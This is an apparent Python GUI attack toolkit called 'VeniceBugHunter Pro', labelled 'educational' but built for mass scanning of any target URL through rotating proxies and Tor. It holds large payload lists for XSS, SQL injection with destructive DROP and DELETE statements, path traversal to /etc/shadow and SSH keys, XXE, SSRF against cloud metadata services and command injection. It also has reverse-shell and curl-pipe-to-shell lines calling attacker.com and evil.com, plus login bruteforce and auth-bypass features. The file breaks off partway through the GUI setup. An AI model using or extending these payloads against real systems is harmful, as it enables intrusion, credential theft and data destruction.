#!/usr/bin/env python3
"""
VeniceBugHunter Pro - Advanced Ethical Hacking Toolkit v2.0
Multi-Proxy Support | Advanced Threading | All Attack Vectors
Educational Purpose Only - Use Responsibly!
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
import socket
import subprocess
import re
import json
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed, ThreadPoolExecutor
import random
import string
import time
import base64
import hashlib
import html
from datetime import datetime
import os
import sys
import queue
import itertools
from collections import defaultdict
import xml.etree.ElementTree as ET
import ssl
import warnings
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import difflib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ProxyManager:
    """Manage 1000+ proxies with rotation and health checking"""
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = set()
        self.current_index = 0
        self.lock = threading.Lock()
        
    def load_from_file(self, filepath):
        """Load proxies from file (format: ip:port or user:pass@ip:port)"""
        try:
            with open(filepath, 'r') as f:
                lines = [l.strip() for l in f if l.strip()]
                for line in lines:
                    if ':' in line:
                        self.proxies.append(line)
            return len(self.proxies)
        except Exception as e:
            return 0
    
    def load_from_string(self, proxy_string):
        """Load proxies from comma-separated string"""
        self.proxies = [p.strip() for p in proxy_string.split(',') if ':' in p.strip()]
        return len(self.proxies)
    
    def get_proxy(self):
        """Get next proxy in rotation"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def get_working_proxy(self):
        """Get a proxy that hasn't failed recently"""
        with self.lock:
            available = [p for p in self.proxies if p not in self.failed_proxies]
            if not available:
                self.failed_proxies.clear()  # Reset if all failed
                available = self.proxies
            if available:
                proxy = random.choice(available)
                return proxy
            return None
    
    def mark_failed(self, proxy):
        """Mark a proxy as failed"""
        with self.lock:
            self.failed_proxies.add(proxy)
    
    def get_proxy_dict(self, proxy_str):
        """Convert proxy string to requests dict"""
        if not proxy_str:
            return None
        return {
            'http': f'http://{proxy_str}',
            'https': f'http://{proxy_str}'
        }

class VeniceBugHunterPro:
    def __init__(self, root):
        self.root = root
        self.root.title("VeniceBugHunter Pro - Advanced Hacking Toolkit")
        self.root.geometry("1600x1000")
        self.root.configure(bg='#0d1117')
        
        # Initialize proxy manager
        self.proxy_manager = ProxyManager()
        
        # Variables
        self.target_url = tk.StringVar()
        self.proxy_file = tk.StringVar()
        self.proxy_list = tk.StringVar()
        self.threads_count = tk.IntVar(value=200)
        self.timeout = tk.IntVar(value=15)
        self.delay = tk.DoubleVar(value=0.1)
        self.retries = tk.IntVar(value=3)
        self.follow_redirects = tk.BooleanVar(value=False)
        self.random_agent = tk.BooleanVar(value=True)
        self.tor_mode = tk.BooleanVar(value=False)
        self.output_dir = tk.StringVar(value="./results")
        self.wordlist_dir = tk.StringVar(value="./wordlists")
        
        # Statistics
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'vulnerabilities': 0
        }
        
        # Attack control
        self.running = False
        self.pause_event = threading.Event()
        self.pause_event.set()
        
        self.setup_ui()
        self.setup_payloads()
        
    def setup_payloads(self):
        """Initialize all attack payloads"""
        
        # XSS Payloads (100+)
        self.xss_payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Advanced
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'-alert(1)-'",
            "';alert(String.fromCharCode(88,83,83))//",
            "\"><img src=x onerror=alert('XSS')>",
            "<input type=text onfocus=alert('XSS') autofocus>",
            
            # Polyglots
            "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            "'>\"<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "'>\"<img/src/onerror=alert(String.fromCharCode(88,83,83))>",
            
            # Context-specific
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";\nalert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "'';!--\"<XSS={$alert()}<",
            
            # Filter bypass
            "<sCrIpT>alert('XSS')</sCrIpT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # HTML5 vectors
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<meter onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # Event handlers
            "<div onmouseover=alert('XSS')>hover me</div>",
            "<div onclick=alert('XSS')>click me</div>",
            "<div onmouseenter=alert('XSS')>hover me</div>",
            "<div onpointerdown=alert('XSS')>click me</div>",
            
            # SVG vectors
            "<svg><script>alert('XSS')</script></svg>",
            "<svg onload=alert('XSS')>",
            "<svg><a xlink:href=\"javascript:alert('XSS')\"><rect width=\"100\" height=\"100\"/></a></svg>",
            
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "[[7*7]]",
            "{{= 7*7}}",
            
            # Angular/React/Vue
            "{{constructor.constructor('alert(1)')()}}",
            "[.constructor.constructor('alert(1)')()]",
            "(window||document).alert(1)",
            "top['al'+'ert'](1)",
            "top[8680439..toString(30)](1)",
            
            # CSP Bypass
            "<script src=//evil.com></script>",
            "<link rel=import href=//evil.com>",
            "<base href=//evil.com>",
            
            # DOM-based
            "#<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:msgbox('XSS')",
            "mhtml:http://evil.com/xss.html",
            "ms-its:mhtml:file://C:\\\\test.mht!http://evil.com/xss.html",
        ]
        
        # SQL Injection payloads (100+)
        self.sql_payloads = [
            # Error-based
            "'", "\"", "`", "\\", ";", "/*", "#", "--", "'--", "\"--", "'/*", "\"/*",
            "')", "\")", "'))", "\"))", "'))", "\")",
            
            # Boolean-based
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
            "' OR '1'='1' #", "' OR '1'='1';--", "' OR 1=1", "' OR 1=1 --",
            "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;", "') OR '1'='1",
            "')) OR ('1'='1", "')) OR (('1'='1", "' OR '1'='1' LIMIT 1--",
            
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,version(),3--", "' UNION SELECT 1,database(),3--",
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3 FROM information_schema.columns--",
            "' UNION SELECT username,password FROM users--",
            
            # Time-based
            "' OR SLEEP(5)--", "' OR SLEEP(5)#", "' OR pg_sleep(5)--",
            "'; WAITFOR DELAY '0:0:5'--", "' OR BENCHMARK(1000000,MD5('A'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND SLEEP(5) AND '1'='1", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)--",
            
            # Stacked queries
            "'; DROP TABLE users; --", "'; DELETE FROM users; --",
            "'; INSERT INTO users VALUES ('admin','password'); --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "'; EXEC xp_cmdshell('dir'); --", "'; EXEC master..xp_cmdshell 'dir'; --",
            
            # Blind injection
            "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
            "' AND ASCII(SUBSTRING((SELECT version()),1,1))>50--",
            
            # WAF bypass
            "'/**/OR/**/1=1", "'%0bOR%0b1=1", "'%0dOR%0d1=1",
            "' OR 1=1-- -", "' OR '1'='1'--+-", "' OR 1=1;%00",
            "' OR 1=1 and '1'='1", "' /*!50000OR*/ 1=1",
            "' OR 1=1#--", "' OR 1=1 AND 1=1#",
            
            # NoSQL
            "{'$ne': null}", "{'$gt': ''}", "{'$regex': '.*'}",
            "' || '1'=='1", "' && '1'=='1", "'; return true; var a='",
            "[$ne]=1", "[$gt]=", "[$regex]=.*",
            
            # XML/XPath
            "' or '1'='1", "'] or //*", "'] | //*",
            "' or '1'='1' or '", "1' and 1=1 or '1'='",
            
            # LDAP
            "*)(uid=*))(&(uid=*", "*)((uid=*", "*))%00",
            "admin)(&))", "admin)(!(&(1=0)",
            
            # Command injection
            "; ls", "| ls", "|| ls", "&& ls", "$(ls)", "`ls`",
            "; cat /etc/passwd", "| cat /etc/passwd", "|| cat /etc/passwd",
            "; whoami", "| whoami", "$(whoami)", "`whoami`",
            "; nc -e /bin/sh attacker.com 4444",
            "$(nc -e /bin/sh attacker.com 4444)",
            "| nc -e /bin/sh attacker.com 4444",
        ]
        
        # LFI/RFI payloads
        self.lfi_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd", "..../..../..../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..././..././..././etc/passwd", "..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd", "file:///C:/windows/win.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input", "data://text/plain,<?php phpinfo(); ?>",
            "expect://ls", "input://", "phar://", "zip://",
            "/proc/self/environ", "/proc/self/fd/0", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "/var/log/httpd/access_log",
            "C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
            "/var/www/html/.htaccess", "/var/www/html/config.php",
            "../../../../../../../../../../etc/passwd%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
            "....//....//....//....//....//....//etc/passwd",
            "/usr/local/apache2/conf/httpd.conf",
            "/etc/httpd/conf/httpd.conf", "/etc/nginx/nginx.conf",
            "../../../../../../etc/shadow", "../../../../../../root/.ssh/id_rsa",
        ]
        
        # XXE payloads
        self.xxe_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>""",
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root/>""",
            """<![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
            "http://[::1]", "http://[0:0:0:0:0:0:0:1]",
            "http://0177.0.0.1", "http://2130706433", "http://3232235521",
            "http://017700000001", "http://0x7f.0x0.0x0.0x1",
            "http://0x7f000001", "http://127.1", "http://127.0.1",
            "file:///etc/passwd", "dict://localhost:22/",
            "gopher://localhost:22/", "gopher://127.0.0.1:3306/",
            "ftp://localhost:22/", "ldap://localhost:389/",
            "tftp://localhost:69/test", "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/", "http://metadata/computeMetadata/v1/",
            "http://192.0.0.192/latest/", "http://100.100.100.200/latest/meta-data/",
            "http://127.0.0.1:22", "http://127.0.0.1:3306",
            "http://127.0.0.1:6379", "http://127.0.0.1:8080",
            "http://127.0.0.1:3000", "http://127.0.0.1:5000",
            "http://127.0.0.1:8000", "http://127.0.0.1:9200",
            "http://127.0.0.1:27017", "http://127.0.0.1:5432",
            "http://0/", "http://127.0.0.1.xip.io/",
            "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
            "http://127.0.0.1%00http://evil.com",
            "http://⑫⑦.⓪.⓪.①", "http://①②⑦.⓪.⓪.①",
        ]
        
        # Command injection payloads
        self.cmdi_payloads = [
            "; ls -la", "| ls -la", "|| ls -la", "&& ls -la", "$(ls -la)", "`ls -la`",
            "; cat /etc/passwd", "| cat /etc/passwd", "|| cat /etc/passwd",
            "; whoami", "| whoami", "|| whoami", "$(whoami)", "`whoami`",
            "; id", "| id", "|| id", "$(id)", "`id`",
            "; uname -a", "| uname -a", "|| uname -a",
            "; pwd", "| pwd", "|| pwd", "$(pwd)", "`pwd`",
            "; ping -c 4 127.0.0.1", "| ping -c 4 127.0.0.1",
            "; nc -e /bin/sh 127.0.0.1 4444",
            "$(nc -e /bin/sh 127.0.0.1 4444)",
            "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "; wget http://evil.com/shell.txt -O /tmp/shell.sh; bash /tmp/shell.sh",
            "; curl http://evil.com/shell | sh",
            "$(< /etc/passwd)", "${IFS}ls${IFS}-la",
            ";/bin/cat /etc/passwd", ";/usr/bin/id",
            ";python${IFS}-c${IFS}'import os;os.system(\"id\")'",
            ";a=ls;$a", ";b=cat;c=/etc/passwd;$b$c",
        ]
        
        # Open redirect payloads
        self.open_redirect_payloads = [
            "//evil.com", "//127.0.0.1", "///evil.com",
            "https://evil.com", "http://evil.com",
            "//evil.com/%2f..", "/\\/evil.com/",
            "/.\\evil.com", "http://evil.com",
            "http://127.0.0.1", "http://localhost",
            "https://127.0.0.1.xip.io/", "http://⑫⑦.⓪.⓪.①",
            "http://0x7f000001", "http://2130706433",
            "http://www.google.comevil.com",
            "http://evil.com:80?http://target.com",
            "http://evil.com@target.com", "http://target.com.evil.com",
            "/%09/evil.com", "/%0a/evil.com", "/%0d/evil.com",
            "///evil.com//", "////evil.com//",
            "https:evil.com", "http:evil.com",
            "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
            "//evil.com/%2e%2e%2f", "..;/evil.com",
        ]
        
        # Host header injection
        self.host_injection_payloads = [
            "evil.com", "127.0.0.1", "localhost",
            "evil.com:80", "127.0.0.1:80",
            "evil.com:443", "127.0.0.1:443",
            "evil.com\nX-Forwarded-For: 127.0.0.1",
            "evil.com\r\nX-Forwarded-For: 127.0.0.1",
            "evil.com\n\rX-Forwarded-For: 127.0.0.1",
        ]
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "sqlmap/1.5.9#stable (http://sqlmap.org)",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
        ]
        
    def setup_ui(self):
        """Setup the GUI"""
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Custom.TFrame', background='#0d1117')
        style.configure('Custom.TLabelframe', background='#161b22', foreground='#58a6ff')
        style.configure('Custom.TLabelframe.Label', background='#161b22', foreground='#58a6ff')
        style.configure('Custom.TButton', background='#238636', foreground='white')
        
        # Main container with scrollbar
        canvas = tk.Canvas(self.root, bg='#0d1117', highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.root, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas, style='Custom.TFrame')
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Title
        title = tk.Label(scrollable_frame, text="🔥 VeniceBugHunter Pro v2.0", 
                        font=("Consolas", 24, "bold"), 
                        bg='#0d1117', fg='#f0883e')
        title.pack(pady=10)
        
        subtitle = tk.Label(scrollable_frame, text="Advanced Multi-Proxy Hacking Toolkit | 100+ Attack Vectors",
                           font=("Consolas", 12), bg='#0d1117', fg='#8b949e')
        subtitle.pack(pady=5)
        
        # Configuration Frame
        config_frame = ttk.LabelFrame(scrollable_frame, text="⚙️ Global Configuration", 
                                       style='Custom.TLabelframe')
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Target
        tk.Label(config_frame, text="🎯 Target URL:", bg='#161b22', fg='white', 
                font=("Consolas", 10, "bold")).grid(row=0, column=0, padx=5, pady=5, sticky='e')
        self.target_entry = ttk.Entry(config_frame, textvariable=self.target_url, width=80)
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, columnspan=3)
        
        # Proxy Configuration
        tk.Label(config_frame, text="🌐 Proxies:", bg='#161b22', fg='white').grid(row=1, column=0, padx=5, pady=5, sticky='e')
        self.proxy_text = scrolledtext.ScrolledText(config_frame, height=3, width=60, bg='#0d1117', fg='#00ff41')
        self.proxy_text.grid(row=1, column=1, padx=5, pady=5, columnspan=2)
        tk.Button(config_frame, text="📁 Load File", command=self.load_proxy_file,
                 bg='#1f6feb', fg='white').grid(row=1, column=3, padx=5, pady=5)
        
        # Threading & Performance
        perf_frame = tk.Frame(config_frame, bg='#161b22')
        perf_frame.grid(row=2, column=0, columnspan=4, pady=5)
        
        tk.Label(perf_frame, text="Threads:", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Spinbox(perf_frame, from_=1, to=1000, textvariable=self.threads_count, width=8).pack(side=tk.LEFT, padx=5)
        
        tk.Label(perf_frame, text="Timeout:", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Spinbox(perf_frame, from_=1, to=120, textvariable=self.timeout, width=8).pack(side=tk.LEFT, padx=5)
        
        tk.Label(perf_frame, text="Delay(s):", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Entry(perf_frame, textvariable=self.delay, width=8).pack(side=tk.LEFT, padx=5)
        
        tk.Label(perf_frame, text="Retries:", bg='#161b22', fg='white').pack(side=tk.LEFT, padx=5)
        ttk.Spinbox(perf_frame, from_=0, to=10, textvariable=self.retries, width=8).pack(side=tk.LEFT, padx=5)
        
        # Options
        opts_frame = tk.Frame(config_frame, bg='#161b22')
        opts_frame.grid(row=3, column=0, columnspan=4, pady=5)
        
        tk.Checkbutton(opts_frame, text="🎲 Random User-Agent", variable=self.random_agent,
                      bg='#161b22', fg='white', selectcolor='#238636').pack(side=tk.LEFT, padx=10)
        tk.Checkbutton(opts_frame, text="🔀 Follow Redirects", variable=self.follow_redirects,
                      bg='#161b22', fg='white', selectcolor='#238636').pack(side=tk.LEFT, padx=10)
        tk.Checkbutton(opts_frame, text="🧅 Tor Mode", variable=self.tor_mode,
                      bg='#161b22', fg='white', selectcolor='#238636').pack(side=tk.LEFT, padx=10)
        
        # Notebook for tools
        self.notebook = ttk.Notebook(scrollable_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create all tabs
        self.create_recon_tab()
        self.create_web_vuln_tab()
        self.create_auth_tab()
        self.create_network_tab()
        self.create_advanced_tab()
        self.create_ctf_tab()
        self.create_exploit_tab()
        
        # Progress & Stats
        stats_frame = ttk.LabelFrame(scrollable_frame, text="📊 Statistics", 
                                      style='Custom.TLabelframe')
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.stats_labels = {}
        stats = ['Requests', 'Success', 'Failed', 'Vulns', 'Proxies']
        for i, stat in enumerate(stats):
            tk.Label(stats_frame, text=f"{stat}:", bg='#161b22', fg='#8b949e').grid(row=0, column=i*2, padx=5, pady=5)
            self.stats_labels[stat] = tk.Label(stats_frame, text="0", bg='#161b22', fg='#00ff41', font=("Consolas", 10, "bold"))
            self.stats_labels[stat].grid(row=0, column=i*2+1, padx=5, pady=5)
        
        # Progress bar
        self.progress = ttk.Progressbar(stats_frame, mode='determinate', length=400)
        self.progress.grid(row=0, column=len(stats)*2, padx=20, pady=5)
        
        # Console Output
        console_frame = ttk.LabelFrame(scrollable_frame, text="🖥️ Output Console", 
                                      style='Custom.TLabelframe')
        console_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg='#0d1117', fg='#00ff41',
                                                 font=("Consolas", 9), height=20)
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Control Buttons
        btn_frame = tk.Frame(scrollable_frame, bg='#0d1117')
        btn_frame.pack(fill=tk.X, pady=10)
        
        buttons = [
            ("▶️ START ALL", self.start_all, '#238636'),
            ("⏸️ PAUSE", self.pause_attack, '#f0883e'),
            ("⏹️ STOP", self.stop_attack, '#da3633'),
            ("💾 SAVE", self.save_results, '#1f6feb'),
            ("🗑️ CLEAR", self.clear_console, '#8b949e'),
            ("📊 EXPORT JSON", self.export_json, '#8957e5'),
        ]
        
        for text, cmd, color in buttons:
            tk.Button(btn_frame, text=text, command=cmd,
                     bg=color, fg='white', font=("Consolas", 11, "bold"),
                     width=15, height=2).pack(side=tk.LEFT, padx=5)
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready | Proxies: 0")
        self.status_bar = tk.Label(scrollable_frame, textvariable=self.status_var,
                                  bg='#161b22', fg='#58a6ff', font=("Consolas", 10))
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
    def create_recon_tab(self):
        """Reconnaissance tab"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="🔍 Recon")
        
        # Subdomain Enum
        frame = ttk.LabelFrame(tab, text="Subdomain Enumeration", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.subdomain_wordlist = tk.StringVar(value="wordlists/subdomains.txt")
        tk.Label(frame, text="Wordlist:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.subdomain_wordlist, width=50).grid(row=0, column=1, padx=5, pady=5)
        tk.Button(frame, text="Browse", command=lambda: self.browse_file(self.subdomain_wordlist)).grid(row=0, column=2, padx=5)
        tk.Button(frame, text="🚀 Start", command=self.subdomain_enum, bg='#238636', fg='white').grid(row=0, column=3, padx=5)
        
        # Port Scanner
        frame2 = ttk.LabelFrame(tab, text="Advanced Port Scanner", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        self.port_range_var = tk.StringVar(value="1-65535")
        self.port_top1000 = tk.BooleanVar(value=True)
        tk.Label(frame2, text="Port Range:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame2, textvariable=self.port_range_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        tk.Checkbutton(frame2, text="Top 1000 only", variable=self.port_top1000, bg='#161b22', fg='white', selectcolor='#238636').grid(row=0, column=2, padx=5)
        tk.Button(frame2, text="🚀 Start", command=self.port_scan, bg='#238636', fg='white').grid(row=0, column=3, padx=5)
        
        # Technology Detection
        frame3 = ttk.LabelFrame(tab, text="Technology Fingerprinting", style='Custom.TLabelframe')
        frame3.pack(fill=tk.X, padx=10, pady=5)
        
        self.tech_detect_var = tk.BooleanVar(value=True)
        tk.Checkbutton(frame3, text="Detect CMS/Frameworks", variable=self.tech_detect_var, bg='#161b22', fg='white', selectcolor='#238636').pack(side=tk.LEFT, padx=10)
        tk.Button(frame3, text="🔍 Analyze", command=self.tech_detect, bg='#238636', fg='white').pack(side=tk.LEFT, padx=10)
        
    def create_web_vuln_tab(self):
        """Web Vulnerabilities tab"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="🌐 Web Vulns")
        
        # Directory Bruteforce
        frame = ttk.LabelFrame(tab, text="Directory Bruteforce (Multi-Extension)", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.dir_wordlist = tk.StringVar(value="wordlists/dirs.txt")
        self.dir_extensions = tk.StringVar(value=".php,.bak,.txt,.zip,.sql,.old,.orig,.tar.gz,.swp")
        self.dir_recursive = tk.BooleanVar(value=False)
        self.dir_status_filter = tk.StringVar(value="200,301,302,403,500")
        
        tk.Label(frame, text="Wordlist:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.dir_wordlist, width=40).grid(row=0, column=1, padx=5, pady=5)
        tk.Label(frame, text="Extensions:", bg='#161b22', fg='white').grid(row=0, column=2, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.dir_extensions, width=30).grid(row=0, column=3, padx=5, pady=5)
        tk.Button(frame, text="🚀 Start", command=self.dir_bruteforce, bg='#238636', fg='white').grid(row=0, column=4, padx=5)
        
        # Vulnerability Scanners
        vulns_frame = ttk.LabelFrame(tab, text="Vulnerability Scanners", style='Custom.TLabelframe')
        vulns_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Scanner buttons
        scanners = [
            ("💉 XSS Scanner", self.xss_scan),
            ("🗄️ SQL Injection", self.sql_scan),
            ("📁 LFI/RFI", self.lfi_scan),
            ("🔄 SSRF", self.ssrf_scan),
            ("📤 XXE", self.xxe_scan),
            ("💻 Command Injection", self.cmdi_scan),
            ("➡️ Open Redirect", self.open_redirect_scan),
            ("🔒 SSL/TLS", self.ssl_scan),
        ]
        
        for i, (text, cmd) in enumerate(scanners):
            btn = tk.Button(vulns_frame, text=text, command=cmd,
                          bg='#1f6feb', fg='white', font=("Consolas", 10),
                          width=20, height=2)
            btn.grid(row=i//4, column=i%4, padx=10, pady=10)
        
    def create_auth_tab(self):
        """Authentication tab"""
        tab = ttk.Frame(self.notebook, style='Custom.TFrame')
        self.notebook.add(tab, text="🔐 Auth")
        
        # Login Bruteforce
        frame = ttk.LabelFrame(tab, text="Login Bruteforce", style='Custom.TLabelframe')
        frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.login_url = tk.StringVar()
        self.login_user = tk.StringVar()
        self.login_pass_wordlist = tk.StringVar(value="wordlists/passwords.txt")
        self.login_csrf = tk.StringVar()
        
        tk.Label(frame, text="Login URL:", bg='#161b22', fg='white').grid(row=0, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.login_url, width=60).grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(frame, text="Username:", bg='#161b22', fg='white').grid(row=1, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.login_user, width=30).grid(row=1, column=1, sticky='w', padx=5, pady=5)
        
        tk.Label(frame, text="Pass Wordlist:", bg='#161b22', fg='white').grid(row=2, column=0, padx=5, pady=5)
        ttk.Entry(frame, textvariable=self.login_pass_wordlist, width=40).grid(row=2, column=1, sticky='w', padx=5, pady=5)
        tk.Button(frame, text="🚀 Bruteforce", command=self.login_bruteforce, bg='#238636', fg='white').grid(row=2, column=2, padx=5)
        
        # Auth Bypass
        frame2 = ttk.LabelFrame(tab, text="Authentication Bypass Techniques", style='Custom.TLabelframe')
        frame2.pack(fill=tk.X, padx=10, pady=5)
        
        bypasses = [
            ("SQL Auth Bypass", self.sql_auth_bypass),
            ("JWT None Algorithm", self.jwt_none_attack),
            ("Session Fixation", self.session_fixation),
            ("OAuth Bypass", self.oauth_bypass),
        ]
        
        for i, (text, cmd) in enumerate(bypasses):
            tk.Button(frame2, text=text, command=cmd, bg='#1f6feb', fg='white',
                     width=20).grid(row=0, column=i, padx=10, pady=10)
        
    def create_network_tab(self):
        """Network attacks tab"""
